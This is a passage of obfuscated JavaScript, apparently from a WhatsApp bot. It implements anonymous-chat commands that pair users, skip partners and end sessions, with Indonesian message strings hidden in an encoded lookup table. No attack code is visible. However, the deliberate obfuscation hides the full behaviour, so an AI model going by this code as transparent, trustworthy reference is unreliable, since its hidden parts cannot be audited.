udCuAq','esi\x20c','balas','statu','bung','h\x20dal','.ww\x20d','us\x20Be','udah\x20','ermai','ilih\x20','si\x20Ca','s\x20men','(✅)','embun','n\x0aKet','rim','engan','ar\x20da','ill\x20n','ma\x20An','ma\x20di','e\x20tem','ong🥲','ah\x20ma','le\x20ka','WqJbX','ara\x20P','al\x20Ya','omor*','pilih','.\x20Den','OLF\x20G','find','perna','bisa\x20','creat','lai\x20s','ke\x20no','an/ro','*Were','ain\x20s','up\x20in','awan\x20','an,\x20m','m\x20har','\x20chat','t\x20aka','n\x20Rah','\x20terp','gan\x20N','\x20Berm','tas\x20p','telah','emula','amu\x20b','*\x20bal','Forma','*\x0a•\x20K','iri\x20d','mulai','tik\x20','a\x20war','ada\x20J','ng\x20ti','_\x0a/sk','inan\x20','itasn','an\x20me','deff','mah\x20m','DZqxw','n\x20kon','Hai\x20k','ce,\x20u','san\x20R','ined','ai\x20Ka','im\x20ke','yer\x20','/secr','mener','l:\x20*$','masih','ng\x20Pe','ontac','FAATX','\x20join','\x20tida','ain\x20P','samaa','toe\x20d','rus\x20b','ah,\x20m','tart\x20','🐼_\x0a/s','nnya\x20','ident','Berha','gunak','alas\x20','r\x20:*\x0a','nkan\x20','\x20mela','owner','inan','*\x0aIsi','reamy','\x20masu','liki\x20','st\x20pl','hat\x20i','\x20para','ika\x20s','an\x20ol','Oh\x20ti','rmat\x20','ang\x20y','er\x20ak','\x20kamu','Balan','masin','warga','MAND*','sesi\x20','chat_','1|4|3','yer\x20b','e\x20pla','msg','untut','\x0aKeti','ce,\x20c','untuk','yarat','rupa\x20','\x20yang','\x0aPerm','[✅]\x20B','amu\x0a\x0a','t\x20rol','esi\x20t','\x20Dibe','\x20memu','ik\x20*.','\x20bot!','37112FnemOU','nghen','Sesi\x20','erank','skip\x20','rofil','s,\x20Ti','FileS','Anda\x20','Yang\x20','engga','\x20di\x20W','u\x20pla','nyihi','r\x20sud','eff\x20n','ip\x20-\x20','irim\x20','\x20memb','t\x20mem','umlah','mberh','exit','dalam','ulai,','OnlyP','.ww\x20s','an\x20ch','getah','yang\x20','Kamu\x20','maina','\x20oleh','🎰\x20Mem','e\x20*ya','0|2|3','\x20kak🥲','encar','15\x20or','\x20Sosi','SlTuA','h\x20*','delet','cek\x20B','\x20dima','no,\x20k','n\x20mal','pus\x20s','lih\x20s','[⚠️]\x20K','ww\x20jo','List\x20','ng\x20ka','hat_','sebag','delca','gify','erupa','h\x20mem','lindu','at\x20an','strin','ri\x20Wa','\x20kelu','dak\x20M','\x20:*\x0a','si\x20pe','\x20kali','al\x20Ha','Limit','layer','\x20diha','ap\x20wa','an\x20*W','main\x20','xit\x0a','ertan','abase','tungg','n,\x20sk','.ww\x20p','reate','t\x20sal','\x20Berh','minim','an\x20pe','san\x20y','\x20Kelu','sorce','an,\x20j','masuk','actoe','ain\x20d','pus','bukan','|2|0','(❌)','pengi','1701365XbtYkJ','ak\x20Be','nce','asi\x20k','*\x20den','ntang','ntukm','as\x20bo','\x20Pera','yg\x20bl','Playe','ran\x20p','man\x20c','denti','i\x20par','kill','an\x20ha','Ditem','i\x20gru','vote','Seora','jawab','\x20meme','a\x20men','atila','playe','ngsun','dream','1\x20pla','ce\x20La','akan\x20'];_0x3c8e=function(){return _0x218f8a;};return _0x3c8e();}function _0x28040b(_0x59e5ba,_0x4024f0,_0x2c0a3f,_0x29933c,_0x53f101){return _0x41b0(_0x59e5ba- -0x266,_0x53f101);}function _0x9b1ba0(_0x551105,_0x10a1ad,_0x153e8f,_0x4664ec,_0x47eb1f){return _0x41b0(_0x551105- -0x2c7,_0x10a1ad);}function _0x41b0(_0x96d023,_0x1fe4cf){const _0x2b5602=_0x3c8e();return _0x41b0=function(_0x16592a,_0x560de6){_0x16592a=_0x16592a-(0x2*-0x137b+0x1000*0x1+0x1766);let _0x2d3443=_0x2b5602[_0x16592a];return _0x2d3443;},_0x41b0(_0x96d023,_0x1fe4cf);}(function(_0x48f5e8,_0x2e0674){const _0x6fa92c=_0x48f5e8();function _0x49ece0(_0x164a8a,_0x12a833,_0x461791,_0x46e34d,_0x116965){return _0x41b0(_0x461791-0x186,_0x46e34d);}function _0xb2a697(_0x5894a1,_0x32e072,_0xbc7a90,_0x5506cd,_0x414aeb){return _0x41b0(_0x5506cd-0x112,_0xbc7a90);}function _0x104ebb(_0x27e3fc,_0x238c10,_0x532271,_0x54b437,_0x2f3f37){return _0x41b0(_0x2f3f37-0x3ba,_0x532271);}function _0x2930aa(_0x3bf781,_0x4659d8,_0x14c78c,_0x5836c7,_0x486dbd){return _0x41b0(_0x4659d8- -0x154,_0x14c78c);}function _0x5d8842(_0x50d8a0,_0x42dd59,_0x5afbad,_0x2d7604,_0x3541e3){return _0x41b0(_0x5afbad-0x221,_0x3541e3);}while(!![]){try{const _0x34df3d=parseInt(_0x5d8842(0x41e,0x558,0x5e2,0x4b2,0x525))/(0x1*0x15c1+0x19dc+0x4*-0xbe7)*(-parseInt(_0x5d8842(0x3ec,0x48a,0x540,0x516,0x4bf))/(-0x13*0xd1+0x1*-0x23b3+0x3338))+parseInt(_0x5d8842(0x4c6,0x178,0x30e,0x501,0x1fe))/(-0xb40+0x16a3+0x7*-0x1a0)*(-parseInt(_0x5d8842(0x32c,0x33b,0x462,0x307,0x470))/(0x1*0xeb1+-0x79d*0x1+-0x710))+parseInt(_0x49ece0(0x6d2,0x381,0x507,0x44d,0x552))/(0x345+-0x152*-0x13+0x1a*-0x117)+parseInt(_0xb2a697(0x466,0x11a,0x289,0x2ef,0x19d))/(-0x1*0x183d+-0x2*0x199+0x27f*0xb)*(parseInt(_0x5d8842(0x7b0,0x5e6,0x640,0x6f6,0x4c8))/(-0xde4+-0xe1e+0x1c09))+parseInt(_0xb2a697(0x323,0x390,0x218,0x39f,0x52b))/(0x2*0x1b2+0x11d2+-0x152e)+parseInt(_0x49ece0(0x32e,0x46f,0x352,0x1ee,0x469))/(0x1ae*0x8+0xf60+-0x1cc7)*(parseInt(_0x49ece0(0x58b,0x581,0x5c3,0x729,0x4ea))/(0x1*-0x233+-0xd*0x35+0x4ee*0x1))+-parseInt(_0x5d8842(0x4f9,0x582,0x5e3,0x498,0x471))/(-0x1*0x155a+-0x41b+0x1980);if(_0x34df3d===_0x2e0674)break;else _0x6fa92c['push'](_0x6fa92c['shift']());}catch(_0xa95bbf){_0x6fa92c['push'](_0x6fa92c['shift']());}}}(_0x3c8e,-0x2*0x3354f+0x10*0x3335+-0x13d7*-0x7b));switch(command){case prefix+(_0x28040b(-0x14e,-0x27c,-0x12f,0xa8,-0x322)+_0x28040b(0x1d,0x2f,0x18e,0x6b,-0x7f)):if(isGroup)return reply(mess[_0x9b1ba0(0x71,0x1ba,0x13e,-0xf4,0x1d7)+'M']);var teks=_0x2fe230(0x31c,0x243,0x3ab,0x39a,0x326)+(pushname!==undefined?pushname:_0x28040b(-0x8d,-0x47,-0x110,-0x99,-0x1de))+(_0x526c7c(0x2d5,0x2e2,0x2d3,0x2b3,0x231)+_0x9b1ba0(-0x22e,-0xb7,-0x260,-0x12c,-0x290)+_0x28040b(0x1bb,0x107,0x302,-0x2c,0x7a)+_0x2fe230(-0x93,-0x44,-0x19c,0xee,-0x1b8)+_0x2fe230(0xba,-0x18,0x168,0x9,-0x1f9)+_0x526c7c(-0x4d,0x12a,0x1b1,0x2be,0x248)+_0x526c7c(0x401,0x265,0x25c,0x3c8,0x82)+_0x9b1ba0(0x140,0x1b5,-0x5d,0x27f,-0x27)+'\x20')+prefix+(_0x9b1ba0(-0x1c8,-0x354,-0x22d,-0x1c6,-0x152)+_0x9b1ba0(-0x87,0xab,-0x67,-0xbd,0xda)+_0x526c7c(0x5b7,0x4cd,0x46f,0x30b,0x4f1)+_0x2fe230(-0x104,0x4,-0x10d,0x1cc,-0xd7)+_0x2fe230(0x111,0x66,-0x81,-0x170,-0x1a)+_0x28040b(-0x35,-0x133,0x155,-0x11a,0xe7)+_0x2fe230(-0x123,-0xf3,-0x246,-0x12c,-0x46)+'a.');reply(teks);break;case prefix+_0x526c7c(0x358,0x1de,0x7e,0xc1,0x2a4):case prefix+(_0x480ff3(-0x28c,-0x20a,-0x2dc,-0x23f,-0x2c1)+'h'):if(isGroup)return reply(mess[_0x9b1ba0(0x71,0x7f,0x142,0x190,0x115)+'M']);var rumss=Object[_0x526c7c(0x38b,0x2bf,0x23b,0x3de,0x355)+'s'](anonymous)[_0x480ff3(-0x36,0xf0,-0x212,-0x90,0x13)](_0x423c24=>anonyCheck(sender,_0x423c24)),rooms=Object[_0x9b1ba0(-0x8c,0x11e,0x46,0x5a,-0x27e)+'s'](anonymous)[_0x28040b(0x48,0x191,0x46,0x177,0x244)](_0x40648e=>anonyCheck(sender,_0x40648e)&&_0x40648e[_0x526c7c(0x333,0x489,0x5ad,0x5db,0x30e)]==_0x9b1ba0(-0xcd,0x72,-0x14a,-0x2c7,-0x1c1)+_0x9b1ba0(-0x22c,-0x172,-0x2f4,-0x160,-0x402));if(rooms){var teks=_0x480ff3(-0x83,0x2f,0xa8,0x12,-0xad)+_0x480ff3(-0x239,-0x66,0x7f,-0xc4,-0x23a)+_0x2fe230(-0x4f,-0x106,-0x5,-0x246,0x11)+_0x28040b(0xd0,0x2ae,-0xcc,0x28b,-0xb6)+_0x2fe230(0x4c,-0x109,0xcb,-0x218,-0x8d)+_0x9b1ba0(-0xc,-0x57,-0x51,-0x14b,0x1ae)+_0x526c7c(0x281,0x263,0xca,0x351,0x64)+_0x480ff3(-0xa1,-0x159,-0x260,-0x124,-0x35)+_0x526c7c(0x560,0x4a2,0x510,0x5d8,0x37a)+_0x2fe230(-0x213,-0xd8,0xab,-0x184,0xe2)+_0x2fe230(0x51,-0x115,-0x26d,-0x235,0x20)+_0x28040b(0x1d4,0x3be,0x79,0x137,0x343)+_0x526c7c(0x2fd,0x120,-0xcf,-0x3d,0x15f)+_0x480ff3(-0x3c0,-0x3e6,-0x24d,-0x280,-0x30c)+_0x9b1ba0(-0x75,0x5c,-0x228,-0x25a,-0x232)+_0x480ff3(-0x11b,-0x240,-0x105,-0x27a,-0x23a)+_0x28040b(-0x117,-0x6a,-0x2d3,-0x2,-0xa2)+_0x480ff3(-0xe3,-0x1c9,-0x2a,-0x210,-0x25a)+_0x526c7c(0x2b9,0x3a7,0x2dc,0x268,0x3a8)+_0x28040b(-0x41,-0x198,-0xad,-0xe4,0x35)+_0x480ff3(-0x30b,-0xbf,-0x182,-0x1bc,-0x201)+_0x2fe230(0x94,0x10f,0x29e,0x1b0,0x88)+_0x28040b(-0x54,-0x202,0x17c,0x7c,-0x3c)+_0x526c7c(0x4e5,0x312,0x2b4,0x2f4,0x208)+_0x2fe230(0x29f,0x13a,-0x4a,-0x19,-0x6a);const _0x147525={};return _0x147525[_0x2fe230(-0x7a,-0xa8,0x4d,0x60,-0x24e)]=teks,conn[_0x2fe230(0x2b,0x1aa,0xc4,0x122,0x26d)+_0x9b1ba0(-0x122,-0x14,-0x1a1,0xbc,0xc1)+'e'](from,_0x147525);}else{if(rumss){var teks=_0x28040b(-0x1de,-0x2c0,-0xb1,-0x130,-0x35a)+_0x9b1ba0(-0x4b,-0x10c,0x142,-0x78,0xb7)+_0x2fe230(0x178,0x153,0xe4,0x26,0xcf)+_0x480ff3(-0x38d,-0x472,-0x486,-0x28c,-0x3e2)+_0x526c7c(0xab,0x25e,0x145,0xb2,0x19d)+_0x9b1ba0(0x7d,-0x98,0x16c,-0x151,0x27f)+_0x9b1ba0(-0xac,-0x147,0x5b,0xe6,-0x26f)+_0x480ff3(-0x1a,-0x168,0x49,-0x4,-0x15a)+_0x2fe230(-0x121,0x13,0x64,-0xb,0x46)+_0x480ff3(-0xf1,-0x269,-0x1d0,-0x218,-0x8d)+_0x9b1ba0(-0xfe,-0x219,0x27,0x7d,-0x16b)+_0x2fe230(0x3e6,0x22f,0x80,0x2cd,0x25e)+_0x28040b(0xba,-0x13,0x21c,0x236,0x88)+_0x2fe230(-0x150,-0x76,0xf6,0x104,-0x19f)+_0x28040b(-0x155,-0xe9,-0x1d8,-0x122,-0x273)+_0x480ff3(0x18,-0x26e,0x155,-0x83,0x144)+'_';const _0x22ad94={};return _0x22ad94[_0x2fe230(-0x22,-0xa8,0xec,0x3c,-0x250)]=teks,conn[_0x480ff3(0x124,-0x42,0x25e,0x86,0x267)+_0x480ff3(-0x199,-0x74,-0x8c,-0x199,-0xc)+'e'](from,_0x22ad94);}}var roomm=Object[_0x9b1ba0(-0x8c,0x162,0x4c,0x4,0x16d)+'s'](anonymous)[_0x526c7c(0x522,0x332,0x1ec,0x38a,0x2f0)](_0x3436d6=>_0x3436d6[_0x2fe230(0xed,0x1eb,0x3e3,0x2d5,0x356)]==_0x2fe230(-0xeb,-0xf6,-0x2cd,-0xdc,-0x176)+'NG'&&!anonyCheck(sender,_0x3436d6));if(roomm){const TkDzLs=(_0x526c7c(0x3e3,0x3c6,0x2ca,0x3ca,0x5b8)+_0x480ff3(-0x42,0x4,0x12,0x63,-0x3a))[_0x28040b(-0xcd,-0x1de,-0x13,-0xe0,-0x264)]('|');let mVPpgk=0x1*0x15e1+0x263+0x4*-0x611;while(!![]){switch(TkDzLs[mVPpgk++]){case'0':roomm['b']=sender;continue;case'1':const _0x3d14e0={};_0x3d14e0[_0x9b1ba0(-0x155,-0x111,-0xb2,-0x235,-0x2d0)]=teks,await conn[_0x480ff3(-0xa6,0x161,0x1ce,0x86,0x1d4)+_0x480ff3(-0x58,-0x256,-0x1f1,-0x199,-0x17)+'e'](roomm['a'],_0x3d14e0);continue;case'2':roomm[_0x2fe230(0x307,0x1eb,0xe8,0x3c3,-0x11)]=_0x28040b(-0x6c,-0xd4,-0x1ce,-0x14c,-0xbe)+_0x526c7c(-0x10,0x11f,0x51,-0x9,-0x1f);continue;case'3':var teks=_0x9b1ba0(-0x175,-0x121,-0x19f,-0x297,-0x113)+_0x480ff3(0xb4,-0x12f,-0x1d1,-0x106,-0x19e)+_0x526c7c(0x573,0x416,0x2b4,0x528,0x340)+_0x28040b(-0x113,-0x190,-0x32,-0xbb,-0x256)+_0x28040b(0x86,0x8,0x1ad,0xc6,0x47)+_0x2fe230(-0xbe,-0xf4,-0x280,-0x284,-0x219)+_0x9b1ba0(-0xfe,-0x2c9,0xcc,-0x12f,-0x1a)+_0x480ff3(0xc6,0x1f2,0x26e,0x10b,0xe3)+_0x2fe230(-0xd7,0x106,0x1bb,0x35,0x8a)+_0x2fe230(0xa3,-0x76,-0x15c,0x168,-0x1db)+_0x2fe230(0x68,-0x109,-0x1ce,-0x4c,-0x116)+_0x2fe230(0xb4,0xa1,0x1cb,0x212,-0x13a)+_0x9b1ba0(0x7,-0x43,-0x42,-0x1ea,0x1e3)+_0x480ff3(-0x1ca,0xa3,-0x134,-0xf,-0x17a)+_0x480ff3(-0x3e6,-0x2e2,-0x12d,-0x29b,-0x2e5)+_0x526c7c(0x1f6,0x297,0x9b,0x26e,0x363)+_0x480ff3(-0x63,-0x187,-0x1da,-0x1cb,-0x20)+_0x526c7c(0x165,0x266,0xd2,0x1c4,0x11c)+_0x2fe230(0x192,0x20e,0x30c,0x8e,0x1c6)+_0x526c7c(0x24c,0x1c4,0x35f,-0x5,0x140)+_0x28040b(-0xa9,-0x1ae,0x8c,-0x104,-0x163)+_0x9b1ba0(0x12f,-0x85,0x7f,0x2eb,0x60)+_0x28040b(0x1d4,0x2d1,0x2ae,0x117,0x2b4)+_0x526c7c(-0x21,0x120,0x1c9,-0x1d,0x296)+_0x28040b(-0x13e,-0x24d,-0x2a5,-0x30a,0x3b)+_0x480ff3(-0x8b,-0xcd,-0x40,0x96,0x162)+_0x526c7c(0x334,0x2dc,0x2fa,0x27c,0x2f3)+_0x480ff3(0x73,0x231,0x2e,0x46,-0x10a)+_0x480ff3(-0x161,-0x128,-0x194,-0x21d,-0x1e8)+_0x28040b(-0x1b1,-0x26a,-0x274,-0x337,-0x1d)+'_';continue;case'4':const _0xc4f3ef={};_0xc4f3ef[_0x2fe230(-0x109,-0xa8,-0x15f,-0x2f,-0x295)]=teks,await conn[_0x9b1ba0(0xfd,0x70,0x291,0x183,0x2c)+_0x28040b(-0xc1,-0x32,-0x27c,-0x2b,-0x290)+'e'](roomm['b'],_0xc4f3ef);continue;}break;}}else{if(!rooms){let id=+new Date();anonymous[id]={'id':id,'a':sender,'b':'','state':_0x2fe230(0x3b,-0xf6,-0x14a,0xf8,-0x3)+'NG'};var teks=_0x2fe230(-0x2ea,-0x192,-0x2d6,-0x177,-0x92)+_0x526c7c(0x260,0x300,0x471,0x453,0x109)+_0x9b1ba0(0xa6,0x14f,0x1f6,0x7b,-0x110)+_0x2fe230(-0x24d,-0x168,-0xa1,-0x352,0x2c)+_0x480ff3(-0x309,-0x1e4,-0x227,-0x164,-0x1a1)+_0x28040b(0xde,0x164,-0xf2,0x297,-0x4c)+_0x9b1ba0(-0xac,-0x17a,-0xa7,-0x6d,-0x78)+_0x480ff3(-0xa9,0xde,0x1c7,-0x4,0x17d)+_0x526c7c(0xa1,0x17c,0xb4,0x17b,0x262)+_0x9b1ba0(0xdd,0x165,0x10a,-0xb2,-0x76)+_0x526c7c(0x324,0x2a9,0x3e2,0x177,0xa7)+_0x9b1ba0(-0x145,0x13,-0x195,0x85,-0x1e9)+_0x2fe230(-0x1a3,0x32,0xea,0x10f,0xa9)+_0x28040b(-0x1ea,-0x18c,-0x2df,-0x1b6,-0x36e)+_0x2fe230(0x81,-0x132,-0x2a0,-0x1db,-0xbe)+_0x28040b(0x1c2,0x2bf,0x1af,0x1f4,0x3a1)+'t_';const _0x167bfa={};_0x167bfa[_0x2fe230(0x9c,-0xa8,0xdb,-0x13,0x153)]=teks,await conn[_0x9b1ba0(0xfd,-0x9d,0xc4,-0x33,0x14f)+_0x2fe230(-0xdd,-0x75,0xf6,0x4b,-0x22e)+'e'](from,_0x167bfa);}}break;case prefix+_0x2fe230(0x33a,0x1c6,0xee,0x18d,0x3c0):if(isGroup)return reply(mess[_0x28040b(0xd2,0x20e,0x3f,-0xed,0x168)+'M']);var roomo=Object[_0x28040b(-0x2b,-0x209,0xb1,-0xd1,-0x24)+'s'](anonymous)[_0x480ff3(-0x147,-0x4,-0x17e,-0x90,0x168)](_0x4f4c1c=>anonyCheck(sender,_0x4f4c1c));if(!roomo){var teks=_0x526c7c(0x35c,0x3d4,0x515,0x506,0x5b5)+_0x480ff3(0xc8,-0x2,0x13b,-0x7a,-0xac)+_0x28040b(-0x1bf,-0x370,-0x43,-0x29c,-0x57)+_0x2fe230(-0x124,0x95,-0xa3,-0x12,0x195)+_0x9b1ba0(-0x1f6,-0x4c,-0x176,-0x133,-0x1df)+_0x28040b(0x1d1,0x367,0xb1,0x350,0x2d)+_0x526c7c(0x5b4,0x4f3,0x3fa,0x5e4,0x5da)+_0x480ff3(0x1dc,0x30,0xf6,0xb3,0x1c8)+_0x2fe230(0x170,0x6c,0x151,0x18f,0x1ff)+_0x480ff3(-0x46f,-0x1e3,-0x215,-0x29b,-0x32d)+_0x2fe230(0x26a,0x1d5,0x110,0x244,0xb)+_0x9b1ba0(-0x191,-0x139,-0x112,-0x83,-0x18)+_0x28040b(0xa3,-0x65,-0x15a,-0xe0,0x133)+_0x480ff3(-0x157,0x142,-0xc0,-0x34,-0x97);const _0x2bb705={};_0x2bb705[_0x28040b(-0xf4,-0x123,0x37,-0x1e9,0x3d)]=teks,await conn[_0x526c7c(0x62e,0x448,0x49f,0x43f,0x557)+_0x28040b(-0xc1,0xa4,0xa5,-0x2a6,-0x60)+'e'](from,_0x2bb705);}else{var teks=_0x480ff3(0x174,-0x193,-0x22,-0x27,-0x1c1)+_0x480ff3(-0x23f,-0x120,0x51,-0x194,-0x66)+_0x2fe230(-0xc7,-0x16e,0x3c,-0xa4,-0x1ed)+_0x2fe230(-0xdb,0x11a,0x1ca,0x2b8,0x118)+_0x9b1ba0(-0x75,-0x8e,0xa8,-0xe8,-0x213)+_0x9b1ba0(0x73,-0x71,0x193,-0x155,0x16e)+_0x526c7c(0x19d,0x17c,0x343,0x358,0x287)+_0x2fe230(0xbc,-0xc0,-0x7b,-0xfd,-0x273)+_0x28040b(0x1d4,0x2b9,0x2a0,0x193,0x2df)+_0x480ff3(-0x1ae,-0x47e,-0x13b,-0x2a2,-0x2a2)+_0x28040b(-0x1f0,-0x2d8,-0x37f,-0x12e,-0x6a)+_0x526c7c(0x56d,0x4ef,0x3c5,0x3db,0x64e)+_0x480ff3(-0x33c,-0x387,-0xf9,-0x1ef,-0xd7)+_0x526c7c(0x34a,0x2e0,0x3de,0xf1,0x1c7),teks2=_0x2fe230(-0x150,-0x189,-0x2a,-0x91,-0x386)+_0x480ff3(-0x1ba,-0x181,-0x14a,-0xb0,-0x273)+_0x526c7c(0x31c,0x380,0x2cc,0x3aa,0x268)+_0x2fe230(-0xff,-0x130,-0xf2,-0x116,-0x1a4)+_0x28040b(-0x78,-0x144,-0x6,0x14f,0x72)+_0x9b1ba0(0x191,0x23b,0xb6,0x1f3,0x21f)+_0x9b1ba0(-0x75,-0x5c,-0x248,0x15d,-0x52)+_0x2fe230(0x29e,0xe5,0x1f5,0x5e,0x19e)+_0x480ff3(-0x317,-0xd7,-0x3cd,-0x265,-0x3ad)+_0x2fe230(-0x6a,0x173,0x2ca,-0x44,0x138)+_0x526c7c(0x109,0xfd,0x8e,-0x80,0x2d2)+_0x2fe230(0xb4,0xfe,0x127,-0xc1,0xd3)+_0x480ff3(0x8d,0x14b,-0x47,0x91,-0x8d)+_0x28040b(-0xfa,-0x200,0x56,0xba,-0x51)+_0x480ff3(0x104,0x91,-0x188,-0x2c,-0xa2)+_0x28040b(0xb6,-0xaf,-0x140,-0xc4,0x14d)+_0x480ff3(-0xf3,-0xc8,-0x8d,-0x8c,-0xe2)+_0x28040b(0x28,-0x17e,-0x172,-0x25,0x225)+_0x2fe230(0x1d8,0x13a,0x1db,0x306,0x2b3);const _0x22de59={};_0x22de59[_0x28040b(-0xf4,-0x177,-0x6e,0x29,0xfc)]=teks,await conn[_0x28040b(0x15e,0x175,-0x5b,0x21,0x32c)+_0x526c7c(0x3f9,0x229,0x9d,0x110,0x2b)+'e'](from,_0x22de59);let other=anonyOther(sender,roomo);const _0x203b9a={};_0x203b9a[_0x480ff3(-0x6d,-0x305,-0x248,-0x1cc,-0x2a5)]=teks2;if(other)await conn[_0x480ff3(0x254,0x147,0x195,0x86,0x209)+_0x480ff3(-0x229,-0x2ce,-0x34b,-0x199,-0x2f8)+'e'](other,_0x203b9a);delete anonymous[roomo['id']];}break;case prefix+_0x480ff3(-0x17d,-0x24c,-0x13b,-0x1af,-0x1c4):case prefix+_0x526c7c(0xa5,0x28d,0x10c,0x378,0x474):if(isGroup)return reply(mess[_0x28040b(0xd2,0x2b9,-0x6e,0x121,0x155)+'M']);let romeo=Object[_0x9b1ba0(-0x8c,-0x19c,-0x1c8,-0x1ad,-0x94)+'s'](anonymous)[_0x480ff3(0x119,-0x208,0x50,-0x90,0x172)](_0x43ecf=>anonyCheck(sender,_0x43ecf));if(!romeo){var teks=_0x2fe230(0x17d,0x136,0x13d,0x171,0x185)+_0x9b1ba0(-0x3,0x15d,0x113,0xab,-0x167)+_0x526c7c(-0x6d,0x12b,-0x7c,0x1ca,0x2c8)+_0x526c7c(0x228,0x333,0x24a,0x1fc,0x285)+_0x28040b(0xf3,0x2e0,0x4e,-0x64,-0xb0)+_0x28040b(-0x130,-0x104,-0x1cc,0xbb,-0x19b)+_0x480ff3(0x71,-0x2b,0x172,0x7c,-0xeb)+_0x526c7c(0x17c,0x2b6,0x107,0x4a3,0x13a)+_0x480ff3(-0x6d,-0x73,-0x103,-0x1e4,-0x9c)+_0x28040b(0x1d4,0x1d9,0x1ed,0x4,0x2b0)+_0x9b1ba0(-0x22b,-0x401,-0xc1,-0x2d,-0x55)+_0x526c7c(-0xe0,0xfa,0x2f7,0xf0,-0xb1)+_0x28040b(0x205,0x35,0x1a,0xef,0x94)+_0x480ff3(-0x250,-0x14c,-0x145,-0x1ef,-0xe5)+_0x28040b(-0xa,0x4c,-0x138,-0x1fc,0x145);const _0x40ed6c={};return _0x40ed6c[_0x480ff3(-0x2cc,-0x31c,-0xcc,-0x1cc,-0x3ab)]=teks,await conn[_0x28040b(0x15e,0xf7,0x2cc,0x193,-0x59)+_0x2fe230(-0xa7,-0x75,0x5b,-0x14d,0x8a)+'e'](from,_0x40ed6c);}else{let other=anonyOther(sender,romeo);var teks1=_0x2fe230(-0x2e,-0x189,-0x28d,-0x196,-0x17c)+_0x28040b(0x28,0xc3,-0xb,0x1b4,-0xdb)+_0x2fe230(-0xcb,0xe2,0x193,0xbb,-0xb)+_0x526c7c(-0x81,0x16e,-0x4a,0x302,0x12)+_0x2fe230(-0x15b,-0x2c,0x18b,0x17,0xb3)+_0x2fe230(0x1fd,0x23e,0x1a4,0xdc,0x107)+_0x2fe230(0x50,0x38,0x59,0x3c,-0x2a)+_0x9b1ba0(0x38,0x19f,-0xe5,-0x6,-0x169)+_0x28040b(-0x18d,-0x1bd,-0x205,-0xd4,0x25)+_0x28040b(0x127,0x26f,0xc0,0x235,0x5c)+_0x480ff3(-0x261,-0x1c3,-0x245,-0x2c5,-0x41e)+_0x480ff3(0x223,0x257,0x23a,0xf5,0x6e)+_0x9b1ba0(-0x1d3,-0x63,-0x160,-0x91,0x24)+_0x9b1ba0(0x24,-0x19c,0x16e,0x8,0x45)+_0x2fe230(0x65,0xb,-0x1d,0xce,0x73)+_0x28040b(-0xe4,-0xaf,-0xa,-0x170,-0x5d)+_0x28040b(0x5d,-0xfe,0x131,-0xcb,0x226)+_0x9b1ba0(-0xe5,-0x281,-0x96,-0x10a,-0x14d)+_0x28040b(0x1c2,-0x36,0x1bb,0x1f7,0x2ac)+'t_';const _0x340e94={};_0x340e94[_0x2fe230(0xb0,-0xa8,0x14c,0x105,-0x161)]=teks1;if(other)await conn[_0x526c7c(0x57e,0x448,0x60a,0x27f,0x28c)+_0x526c7c(0x245,0x229,0x3bf,0x95,0x352)+'e'](other,_0x340e94);delete anonymous[romeo['id']];}let room=Object[_0x526c7c(0x20b,0x2bf,0x432,0x3c9,0x1e0)+'s'](anonymous)[_0x28040b(0x48,0x230,0x147,0x30,0x1c6)](_0x1989e9=>_0x1989e9[_0x28040b(0x19f,0x1d1,0x3a1,0x9b,0x1b)]==_0x2fe230(0x81,-0xf6,-0x166,0x31,-0x18a)+'NG'&&!anonyCheck(sender,_0x1989e9));if(room){const PSkKBE=(_0x2fe230(-0x5c,-0x11e,0xa4,-0xa8,-0x24c)+_0x9b1ba0(-0x82,-0x16a,0x2f,0x33,-0x161))[_0x2fe230(-0x22a,-0x81,0x52,-0x205,0xbe)]('|');let hbLBjA=0x1a16+-0x1*0x1091+-0x985;while(!![]){switch(PSkKBE[hbLBjA++]){case'0':const _0x2b537a={};_0x2b537a[_0x9b1ba0(-0x155,-0x1ae,0x9d,0x2a,-0x3e)]=teks,await conn[_0x480ff3(0x25b,0x35,0x22e,0x86,-0x12b)+_0x526c7c(0x68,0x229,0x6b,0x8a,0x66)+'e'](room['b'],_0x2b537a);continue;case'1':room[_0x480ff3(0x62,0x81,0x176,0xc7,0x26)]=_0x9b1ba0(-0xcd,0x96,0x45,-0x60,-0x293)+_0x2fe230(-0x123,-0x17f,-0x252,-0x1c8,-0x2a7);continue;case'2':var teks=_0x28040b(-0x114,-0x28e,0x7f,-0x4,0x33)+_0x2fe230(0x1f5,0x1e,0x202,-0xd3,-0x1c6)+_0x9b1ba0(0xcb,0x26e,0x1da,-0xab,0x260)+_0x2fe230(-0x1dd,-0xc7,-0x3e,-0x1d0,-0x101)+_0x526c7c(0x339,0x370,0x46c,0x28e,0x46a)+_0x9b1ba0(-0x1a1,-0x379,-0x27b,-0x279,-0x230)+_0x28040b(-0x9d,-0x14e,0x105,0x120,0x4a)+_0x9b1ba0(0x182,0x12b,0xb5,0x3b,0x136)+_0x28040b(0xba,0x66,0x21c,-0xe7,0x7b)+_0x480ff3(-0x84,-0x199,-0x1f,-0x19a,-0x33c)+_0x28040b(-0x155,-0x258,-0xb8,-0x2ac,-0x1d0)+_0x9b1ba0(-0xc,-0xc5,0x1a3,0xa6,-0x87)+_0x2fe230(-0xbd,0xb4,-0x138,-0xec,0x233)+_0x526c7c(0x216,0x3b3,0x286,0x46b,0x32b)+_0x526c7c(0xd3,0x127,0x188,0x12c,0x21f)+_0x480ff3(-0x149,-0x128,-0xf2,-0x12b,-0x196)+_0x2fe230(-0x115,-0xa7,0x134,0x2d,0x23)+_0x526c7c(0x3e9,0x266,0x2af,0x43f,0x33f)+_0x480ff3(-0x17,-0x6a,0xed,0xea,0x253)+_0x526c7c(0x2fc,0x1c4,0x3a3,0x28a,0x1ac)+_0x480ff3(-0x1bb,-0x36b,0x2,-0x181,-0x2ce)+_0x526c7c(0x3bc,0x47a,0x40b,0x5e1,0x474)+_0x2fe230(0x2b7,0x220,0x146,0x31c,0x27e)+_0x2fe230(-0x339,-0x17e,-0x16e,-0x325,0x11)+_0x480ff3(-0x104,-0x3f8,-0x38e,-0x216,-0x277)+_0x9b1ba0(0x10d,0x18b,-0x83,0x2a8,0xfe)+_0x28040b(-0xe,0x9f,-0x75,0x85,-0x137)+_0x28040b(0x11e,0x1d0,0x245,0x1,0x248)+_0x9b1ba0(-0x1a6,-0x2b1,-0x29e,-0x32f,-0x18c)+_0x2fe230(-0x348,-0x165,-0x11d,-0x344,-0x16d)+'_';continue;case'3':const _0x2b2b45={};_0x2b2b45[_0x9b1ba0(-0x155,-0x1ab,0x26,0x42,-0x2c2)]=teks,await 